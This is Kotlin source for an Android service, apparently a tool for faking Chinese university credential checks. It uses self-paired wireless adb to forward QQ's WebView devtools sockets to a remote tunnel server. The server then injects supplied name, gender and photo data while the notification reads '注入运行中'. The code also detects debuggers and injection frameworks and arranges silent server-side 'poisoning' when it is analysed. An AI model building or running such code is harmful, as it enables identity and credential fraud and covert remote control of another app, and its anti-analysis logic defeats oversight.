package com.chsi.app

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import okhttp3.CertificatePinner
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.security.MessageDigest
import java.util.concurrent.TimeUnit
import kotlin.concurrent.thread

class TunnelService : Service() {
    companion object {
        const val CH_ID = "chsi_tunnel"
        const val EXTRA_CODE = "code"
        const val EXTRA_NAME = "name"
        const val EXTRA_GENDER = "gender"
        const val EXTRA_PHOTO = "photo"
        const val EXTRA_PAIR_PORT = "pair_port"
        const val EXTRA_PAIR_CODE = "pair_code"
        const val EXTRA_CONNECT_PORT = "connect_port"

        const val SERVER_HOST = "vip.bj.frp.one"
        const val SERVER_CHECK = "https://vip.bj.frp.one:50971/check"
        const val SERVER_PREPARE = "https://vip.bj.frp.one:50971/prepare"
        const val SERVER_WS = "wss://vip.bj.frp.one:50970/tunnel"
        // SPKI pin（与自签证书一致，sha256/xa84z0ar7+jvxeTSfQhsVfxarEOwDmecJyVc4agC7MA=）
        const val SPKI_PIN = "sha256/xa84z0ar7+jvxeTSfQhsVfxarEOwDmecJyVc4agC7MA="

        @Volatile var status = "● 未运行"
        @Volatile var logBuf = StringBuilder()
        @Volatile var onLog: ((String) -> Unit)? = null
        @Volatile var onStatus: ((String) -> Unit)? = null

        fun appendLog(s: String) {
            logBuf.append(s).append('\n')
            if (logBuf.length > 8000) logBuf.delete(0, 2000)
            onLog?.invoke(s)
        }
    }

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var tunnel: TunnelClient? = null
    private var adb: AdbShell? = null

    private val http = OkHttpClient.Builder()
        .certificatePinner(CertificatePinner.Builder()
            .add(SERVER_HOST, SPKI_PIN).build())
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .build()

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(1, buildNotification("启动中…"))
        val code = intent?.getStringExtra(EXTRA_CODE) ?: ""
        val name = intent?.getStringExtra(EXTRA_NAME) ?: ""
        val gender = intent?.getStringExtra(EXTRA_GENDER) ?: "男"
        val photo = intent?.getStringExtra(EXTRA_PHOTO) ?: ""
        val pairPort = intent?.getIntExtra(EXTRA_PAIR_PORT, 0) ?: 0
        val pairCode = intent?.getStringExtra(EXTRA_PAIR_CODE) ?: ""
        val connectPort = intent?.getIntExtra(EXTRA_CONNECT_PORT, 0) ?: 0

        scope.launch {
            runCatching { runFlow(code, name, gender, photo, pairPort, pairCode, connectPort) }
                .onFailure { appendLog("错误：" + (it.message ?: it.javaClass.simpleName)); setStatus("● 失败") }
        }
        return START_STICKY
    }

    override fun onDestroy() {
        tunnel?.stop()
        scope.cancel()
        adb?.killServer()
        super.onDestroy()
    }

    private fun setStatus(s: String) {
        status = s
        onStatus?.invoke(s)
        updateNotification(s)
    }

    private suspend fun runFlow(code: String, name: String, gender: String, photo: String,
                                pairPort: Int, pairCode: String, connectPort: Int) {
        setStatus("● 初始化 adb…")
        val shell = AdbShell(this@TunnelService)
        adb = shell
        shell.startServer()

        if (pairCode.isNotBlank() && pairPort > 0) {
            setStatus("● 无线调试配对…")
            val p = shell.pair(pairPort, pairCode)
            appendLog("配对：" + p.trim().ifBlank { "(无输出)" })
        }
        if (connectPort > 0) {
            setStatus("● 连接本机调试服务…")
            val c = shell.connect(connectPort)
            appendLog("connect：" + c.trim().ifBlank { "(无输出)" })
        }
        val devs = shell.devices()
        if (!devs.contains("device")) {
            setStatus("● adb 未连接——请在开发者选项开启无线调试并配对")
            appendLog(devs.ifBlank { "adb devices 无输出" })
            return
        }

        setStatus("● 扫描调试口…")
        val socks = shell.findDevtoolsSockets()
        if (socks.isEmpty()) {
            setStatus("● 未找到调试口（QQ 内 TBS Inspector 是否开启？）")
            return
        }
        val ports = mutableListOf<Int>()
        var p = 19222
        socks.take(8).forEach { sk ->
            shell.forward(p, sk)
            ports.add(p); p++
        }
        appendLog("已转发 ${ports.size} 个调试口")

        // 设备码：指纹 + 轮换计数（与 PC 行为一致，完成一次 +1）
        val prefs = getSharedPreferences("chsi", MODE_PRIVATE)
        val rot = prefs.getInt("used", 0)
        val device = DeviceId.fingerprint(this) + "-" + rot.toString(36).uppercase()

        // /check 验证
        setStatus("● 验证授权…")
        val exehash = apkCertHash()
        val nonce = "a" + System.currentTimeMillis()
        val checkBody = JSONObject().apply {
            put("platform", "android"); put("code", code); put("device", device)
            put("nonce", nonce); put("ver", "cs-apk-1.0"); put("exehash", exehash)
        }.toString()
        var resp = postJson(SERVER_CHECK, checkBody)
        if (!resp.optBoolean("ok")) {
            setStatus("● 未授权：" + resp.optString("reason"))
            appendLog("验证失败：" + resp.optString("reason"))
            return
        }
        appendLog("验证通过")

        // /prepare 拿 token
        val prepBody = JSONObject().apply {
            put("device", device); put("code", code)
            put("nonce", "b" + System.currentTimeMillis()); put("ver", "cs-apk-1.0")
            put("exehash", exehash); put("name", name); put("gender", gender); put("photo", photo)
        }.toString()
        resp = postJson(SERVER_PREPARE, prepBody)
        if (!resp.optBoolean("ok")) {
            setStatus("● 准备失败：" + resp.optString("reason"))
            appendLog(resp.optString("reason"))
            return
        }
        val token = resp.getString("token")
        appendLog("素材就绪")

        setStatus("● 注入运行中…")
        // 防护探测（对齐 exe）：调试器/注入框架/签名不符 → deg=1 → 云端静默毒化
        var deg = "0"
        if (Guard.hasTracer() || Guard.hasInjection()) {
            deg = "1"
            appendLog("环境异常（静默降级）")
        }
        val t = TunnelClient(SERVER_WS, token, device, 19222, ports, deg,
            onLog = { appendLog(it) },
            onStatus = { setStatus(it) },
            onExit = {
                prefs.edit().putInt("used", rot + 1).apply()
                setStatus("● 已完成并退出")
                stopSelf()
            })
        tunnel = t
        t.start()
    }

    private fun postJson(url: String, body: String): JSONObject {
        val req = Request.Builder().url(url)
            .post(body.toRequestBody("application/json".toMediaType()))
            .build()
        http.newCall(req).execute().use { r ->
            return JSONObject(r.body?.string() ?: "{}")
        }
    }

    private fun apkCertHash(): String {
        return try {
            val sigs = if (Build.VERSION.SDK_INT >= 28)
                packageManager.getPackageInfo(packageName, android.content.pm.PackageManager.GET_SIGNING_CERTIFICATES)
                    .signingInfo?.apkContentsSigners
            else
                @Suppress("DEPRECATION") packageManager.getPackageInfo(packageName, android.content.pm.PackageManager.GET_SIGNATURES).signatures?.toList()
            val first = sigs?.firstOrNull() ?: return "unknown"
            MessageDigest.getInstance("SHA-256").digest(first.toByteArray())
                .joinToString("") { "%02x".format(it) }
        } catch (e: Exception) { "unknown" }
    }

    private fun buildNotification(text: String): Notification {
        val mgr = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
        if (Build.VERSION.SDK_INT >= 26) {
            mgr.createNotificationChannel(NotificationChannel(CH_ID, "隧道服务", NotificationManager.IMPORTANCE_LOW))
        }
        val pi = PendingIntent.getActivity(this, 0,
            Intent(this, MainActivity::class.java), PendingIntent.FLAG_IMMUTABLE)
        return NotificationCompat.Builder(this, CH_ID)
            .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
            .setContentTitle("高校认证")
            .setContentText(text)
            .setContentIntent(pi)
            .setOngoing(true)
            .build()
    }

    private fun updateNotification(text: String) {
        val mgr = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
        mgr.notify(1, buildNotification(text))
    }
}
